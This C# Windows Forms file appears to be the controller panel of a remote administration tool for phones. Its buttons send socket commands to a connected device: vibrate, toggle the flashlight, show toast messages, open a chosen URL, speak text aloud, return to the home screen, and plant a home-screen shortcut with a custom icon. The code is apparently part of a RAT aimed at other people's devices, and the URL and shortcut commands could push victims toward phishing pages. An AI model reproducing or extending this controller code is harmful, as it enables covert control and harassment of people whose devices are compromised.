using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Eglence : Form
    {
        Socket sck; public string ID = "";
        public Eglence(Socket socket, string aydi)
        {
            InitializeComponent();
            sck = socket; ID = aydi;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {

                Form1.KomutGonder("VIBRATION", "[VERI]" + ((int)numericUpDown1.Value * 1000).ToString() + "[VERI][0x09]", sck);
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("FLASH", "[VERI]AC[VERI][0x09]", sck);
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("FLASH", "[VERI]KAPA[VERI][0x09]", sck);
            }
            catch (Exception) { }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("TOST", "[VERI]" + textBox1.Text + "[VERI][0x09]", sck);
            }
            catch (Exception) { }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("URL", "[VERI]" + textBox2.Text + "[VERI][0x09]", sck);
            }
            catch (Exception) { }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("ANASAYFA", "[VERI][0x09]", sck);
            }
            catch (Exception) { }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("KONUS", "[VERI]" + textBox3.Text + "[VERI][0x09]", sck);
            }
            catch (Exception) { }
        }
        byte[] ico_bytes = default;
        public byte[] ImageToByteArray(Image imageIn)
        {
            using (var ms = new MemoryStream())
            {
                imageIn.Save(ms, ImageFormat.Png);
                return ms.ToArray();
            }
        }
        private void button9_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog op = new OpenFileDialog()
            {
                Multiselect = false,
                Filter = "Image files (.jpg .png .jpeg)|*.jpeg;*.png;*.jpg",
                Title = "Select an icon.."
            })
            {
                if (op.ShowDialog() == DialogResult.OK)
                {
                    pictureBox1.ImageLocation = op.FileName;
                    Image img = ResizeImage(Image.FromFile(op.FileName), 72, 72);
                    ico_bytes = ImageToByteArray(img);
                }
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (pictureBox1.Image != null)
            {
                Form1.KomutGonder("SHORTCUT", "[VERI]" + textBox4.Text + "[VERI]" + textBox5.Text + "[VERI]" + Convert.ToBase64String(ico_bytes) + "[VERI][0x09]", sck);
            }
        }
        public static Bitmap ResizeImage(Image image, int width, int height)
        {
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);
            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);
            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = CompositingMode.SourceCopy;
                graphics.CompositingQuality = CompositingQuality.HighQuality;
                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
                using (var wrapMode = new ImageAttributes())
                {

                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
                }
            }
            return destImage;
        }

        private void button10_Click(object sender, EventArgs e)
        {
            try
            {
            }
            catch (Exception) { }
        }
    }
}
